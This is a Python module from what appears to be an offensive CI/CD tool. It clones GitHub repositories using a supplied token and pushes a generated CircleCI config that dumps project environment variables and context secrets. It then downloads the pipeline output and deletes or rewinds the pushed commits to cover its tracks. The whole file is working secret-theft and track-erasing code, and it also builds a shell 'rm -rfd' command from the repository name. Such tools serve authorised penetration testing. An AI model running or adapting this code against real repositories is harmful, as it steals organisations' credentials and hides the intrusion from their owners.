import glob as globmod
import logging
import subprocess
from os import makedirs, chdir
from os.path import basename, realpath

from nordstream.cicd.circleci import CircleCI, CircleCIError
from nordstream.yaml.circleci import CircleCIPipelineGenerator
from nordstream.yaml.custom import CustomGenerator
from nordstream.utils.log import logger, NordStreamLog
from nordstream.utils.constants import DEFAULT_CIRCLECI_CONFIG_FILENAME, OUTPUT_DIR
from nordstream.git import Git
from nordstream.core.circleci.utils import (
    displayProjectEnvVars,
    displayContexts,
    extractAndSaveSecrets,
)


class CircleCIRunner:
    """
    CircleCI secret extraction via git push injection.
    Instantiated by GitHubWorkflowRunner (and in the future GitLabRunner).
    """

    _gitCicd = None
    _circleCicd = None
    _vcsType = "gh"
    _circleOrg = None
    _circleProject = None

    _yaml = None
    _extractProject = True
    _extractOrg = True
    _cleanLogs = True
    _pushedCommitsCount = 0
    _branchAlreadyExists = False
    _configFilename = DEFAULT_CIRCLECI_CONFIG_FILENAME

    _resolvedProjects = {}

    def __init__(self, gitCicd, circleCicd, vcsType="gh", circleOrg=None, circleProject=None):
        self._gitCicd = gitCicd
        self._circleCicd = circleCicd
        self._vcsType = vcsType
        self._circleOrg = circleOrg
        self._circleProject = circleProject
        self._resolvedProjects = {}
        self.__createLogDir()

    # ------------------------------------------------------------------
    # Properties
    # ------------------------------------------------------------------

    @property
    def extractProject(self):
        return self._extractProject

    @extractProject.setter
    def extractProject(self, value):
        self._extractProject = value

    @property
    def extractOrg(self):
        return self._extractOrg

    @extractOrg.setter
    def extractOrg(self, value):
        self._extractOrg = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def __createLogDir(self):
        self._circleCicd.outputDir = realpath(OUTPUT_DIR) + "/circleci"
        makedirs(self._circleCicd.outputDir, exist_ok=True)

    @staticmethod
    def __createCircleCIDir():
        makedirs(".circleci", exist_ok=True)

    def __resolveForRepo(self, repo):
        """
        Auto-discover the CircleCI project for a GitHub/GitLab repo.
        Skipped if vcsType, circleOrg, and circleProject are all explicitly set.
        Results are cached per repo.
        """
        if None not in (self._circleOrg, self._circleProject, self._vcsType):
            return None

        if repo not in self._resolvedProjects:
            logger.verbose(f"Auto-resolving CircleCI project for '{repo}'")
            result = self._circleCicd.findProjectByRepo(repo)
            self._resolvedProjects[repo] = result
            if result:
                logger.verbose(
                    f"Resolved '{repo}' → {result['project_slug']} "
                    f"(vcs_type={result['vcs_type']})"
                )
            else:
                logger.warning(
                    f"Could not find a CircleCI project linked to \"{repo}\". "
                    f"Use --circleci-vcs, --circleci-org and --circleci-project to specify it manually."
                )
        return self._resolvedProjects[repo]

    def __effectiveVcsType(self, repo):
        """Return the VCS type, from auto-resolution or the explicit _vcsType."""
        resolved = self.__resolveForRepo(repo)
        if resolved:
            return resolved["vcs_type"]
        return self._vcsType or "gh"

    def __projectSlug(self, repo):
        """Build the CircleCI project slug, using auto-resolution when needed."""
        resolved = self.__resolveForRepo(repo)
        if resolved:
            slug = resolved["project_slug"]
            logger.verbose(f"CircleCI project slug (auto-resolved): {slug}")
            return slug

        git_org, repo_short = repo.split("/", 1)
        vcs = self.__effectiveVcsType(repo)
        org = self._circleOrg if self._circleOrg is not None else git_org
        project = self._circleProject if self._circleProject is not None else repo_short
        slug = f"{vcs}/{org}/{project}"
        logger.verbose(f"CircleCI project slug: {slug}")
        return slug

    def __circleOrgForRepo(self, repo):
        """Return the CircleCI org identifier for context listing."""
        resolved = self.__resolveForRepo(repo)
        if resolved:
            return resolved["circle_org"]
        if self._circleOrg is not None:
            return self._circleOrg
        return repo.split("/")[0]

    def __repoOutputDir(self, repo):
        """Return the per-repo output sub-directory path."""
        repoPath = repo.replace("/", "_")
        path = f"{self._circleCicd.outputDir}/{repoPath}"
        makedirs(path, exist_ok=True)
        return path

    # ------------------------------------------------------------------
    # Secret listing (read-only, names only via API)
    # ------------------------------------------------------------------

    def listCircleCISecrets(self):
        logger.info("Listing CircleCI secrets (names only):")
        for repo in self._gitCicd.repos:
            logger.info(f'"{repo}" CircleCI secrets')
            projectSlug = self.__projectSlug(repo)

            if self._extractProject:
                self.__displayProjectEnvVars(projectSlug)

            if self._extractOrg:
                self.__displayContexts(repo)

    def __displayProjectEnvVars(self, projectSlug):
        displayProjectEnvVars(self._circleCicd, projectSlug)

    def __displayContexts(self, repo):
        displayContexts(
            self._circleCicd,
            self.__effectiveVcsType(repo),
            self.__circleOrgForRepo(repo),
        )

    # ------------------------------------------------------------------
    # Pipeline extraction
    # ------------------------------------------------------------------

    def start(self):
        for repo in self._gitCicd.repos:
            logger.success(f'"{repo}" (CircleCI)')

            gitBase = getattr(self._gitCicd, 'gitBaseUrl', 'github.com')
            url = f"https://foo:{self._gitCicd.token}@{gitBase}/{repo}"
            Git.gitClone(url)

            repoShortName = repo.split("/")[1]
            chdir(repoShortName)

            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._gitCicd.branchName)
            Git.gitInitialization(self._gitCicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                self.__createCircleCIDir()
                self.__dispatchPipeline(repo)

            except KeyboardInterrupt:
                pass

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:
                self.__clean(repo)
                chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

        logger.info(f"Check output: {self._circleCicd.outputDir}")

    def __dispatchPipeline(self, repo):
        if self._yaml:
            self.__runCustomPipeline(repo)
        else:
            self.__runSecretsExtractionPipeline(repo)

    # ------------------------------------------------------------------
    # Custom YAML
    # ------------------------------------------------------------------

    def __runCustomPipeline(self, repo):
        logger.info(f"Running custom CircleCI pipeline: {self._yaml}")

        generator = CustomGenerator()
        generator.loadFile(self._yaml)
        self._configFilename = basename(self._yaml)

        if self.__generateAndLaunchPipeline(repo, generator, "custom"):
            self.__displayCustomPipelineOutput(repo)

        logger.empty_line()

    def __displayCustomPipelineOutput(self, repo):
        outputDir = self.__repoOutputDir(repo)
        files = globmod.glob(f"{outputDir}/circleci_custom_*.log")
        if files:
            with open(sorted(files)[-1], "r") as f:
                logger.success("Pipeline output:")
                for line in f:
                    logger.raw(line, logging.INFO)

    # ------------------------------------------------------------------
    # Secrets extraction
    # ------------------------------------------------------------------

    def __runSecretsExtractionPipeline(self, repo):
        projectSlug = self.__projectSlug(repo)

        projectVars = []
        contextNames = []

        try:
            if self._extractProject:
                projectVars = self._circleCicd.listProjectEnvVars(projectSlug)
        except CircleCIError as e:
            logger.error(f"Can't list project env vars: {e}")

        try:
            if self._extractOrg:
                orgIdentifier = self.__circleOrgForRepo(repo)
                orgId = self._circleCicd.getOrgId(self.__effectiveVcsType(repo), orgIdentifier)
                if orgId:
                    contexts = self._circleCicd.listContexts(orgId)
                    contextNames = [c["name"] for c in contexts]
        except CircleCIError as e:
            logger.error(f"Can't list contexts: {e}")

        if not projectVars and not contextNames:
            logger.info(f'No CircleCI secrets found for "{repo}"')
            logger.empty_line()
            return

        logger.info(f'Found CircleCI secrets for "{repo}":')
        if projectVars:
            logger.info(f"  Project env vars ({len(projectVars)}): {', '.join(projectVars)}")
        if contextNames:
            logger.info(f"  Contexts ({len(contextNames)}): {', '.join(contextNames)}")

        generator = CircleCIPipelineGenerator()
        generator.generatePipelineForSecretsExtraction(projectVars, contextNames)

        if self.__generateAndLaunchPipeline(repo, generator, "secrets"):
            self.__extractSensitiveInformationFromPipelineResult(repo)

        logger.empty_line()

    # ------------------------------------------------------------------
    # Pipeline lifecycle
    # ------------------------------------------------------------------

    def __generateAndLaunchPipeline(self, repo, generator, outputName):
        try:
            pipelineId, workflowId, workflowStatus, jobNumber = self.__launchPipeline(repo, generator)
            return self.__postProcessingPipeline(repo, workflowId, workflowStatus, jobNumber, outputName)
        except Exception as e:
            logger.error(f"Error: {e}")
            if logger.getEffectiveLevel() == logging.DEBUG:
                logger.exception(e)
            return False

    def __launchPipeline(self, repo, generator):
        """Write config.yml → git push → find triggered pipeline → wait."""
        logger.verbose("Launching CircleCI pipeline.")
        logger.info(f'Pushing to branch "{self._gitCicd.branchName}"')

        configPath = f".circleci/{self._configFilename}"
        generator.writeFile(configPath)

        pushOutput = Git.gitPush(self._gitCicd.branchName)
        _, stderr = pushOutput.communicate()
        pushOutput.wait()

        if b"Everything up-to-date" in stderr.strip():
            logger.error("Error when pushing code: Everything up-to-date")
            raise Exception("Git push: everything up-to-date, nothing to push.")

        if pushOutput.returncode != 0:
            logger.error("Error when pushing code:")
            logger.raw(stderr, logging.INFO)
            raise Exception("Git push failed.")

        self._pushedCommitsCount += 1
        logger.raw(stderr)

        projectSlug = self.__projectSlug(repo)

        # Poll for the webhook-triggered pipeline first (short window).
        # All integration types fire a webhook on push. Calling triggerPipeline()
        # on top causes two pipelines to race; auto-cancel rules kill ours.
        # Fall back to an explicit API trigger only if no webhook pipeline appears.
        logger.verbose("Waiting for webhook-triggered pipeline.")
        pipelineId = self._circleCicd.findPipelineOnBranch(
            projectSlug, self._gitCicd.branchName, maxRetry=3
        )

        if not pipelineId:
            logger.verbose("No webhook pipeline found, triggering via API.")
            pipelineId = self._circleCicd.triggerPipeline(
                projectSlug, self._gitCicd.branchName
            )

        if not pipelineId:
            raise CircleCIError("Failed to find or trigger CircleCI pipeline.")

        logger.verbose(f"Pipeline ID: {pipelineId}")

        workflowId, status = self._circleCicd.waitPipeline(pipelineId)

        if not workflowId:
            raise CircleCIError("Pipeline timed out waiting for a workflow to start.")

        # Resolve the job number from the workflow
        jobs = self._circleCicd.getWorkflowJobs(workflowId)
        jobNumber = None
        for job in jobs:
            if job.get("name") == "init":
                jobNumber = job.get("job_number")
                break

        if jobNumber is None and jobs:
            jobNumber = jobs[0].get("job_number")

        return pipelineId, workflowId, status, jobNumber

    def __postProcessingPipeline(self, repo, workflowId, status, jobNumber, outputName):
        if workflowId is None:
            return False

        if status == "success":
            logger.success("Pipeline completed successfully.")
        elif status in ("failed", "error"):
            logger.error(f"Pipeline {status}.")
            return False
        else:
            logger.warning(f"Unexpected pipeline status: {status}")
            return False

        if jobNumber is None:
            logger.error("Could not determine job number — cannot download output.")
            return False

        projectSlug = self.__projectSlug(repo)
        outputDir = self.__repoOutputDir(repo)
        filePath = self._circleCicd.downloadJobOutput(
            projectSlug, jobNumber, outputDir,
            outputName.replace("/", "_").replace(" ", "_"),
        )
        return filePath is not None

    # ------------------------------------------------------------------
    # Output extraction
    # ------------------------------------------------------------------

    def __extractSensitiveInformationFromPipelineResult(self, repo, informationType="Secrets"):
        outputDir = self.__repoOutputDir(repo)
        extractAndSaveSecrets(outputDir, "circleci_secrets_*.log", informationType)

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------

    def __clean(self, repo):
        if self._pushedCommitsCount == 0:
            return

        if self._cleanLogs:
            logger.info("Cleaning CircleCI pipeline logs.")
            logger.verbose("CircleCI run logs must be deleted manually via the UI.")

        logger.verbose("Cleaning commits.")
        if self._branchAlreadyExists and self._gitCicd.branchName != self._gitCicd.defaultBranchName:
            Git.gitUndoLastPushedCommits(self._gitCicd.branchName, self._pushedCommitsCount)
        else:
            deleteOutput = Git.gitDeleteRemote(self._gitCicd.branchName)
            deleteOutput.wait()
            if deleteOutput.returncode != 0:
                logger.error(f"Error deleting remote branch {self._gitCicd.branchName}")
                Git.gitCleanRemote(self._gitCicd.branchName, leaveOneFile=True)
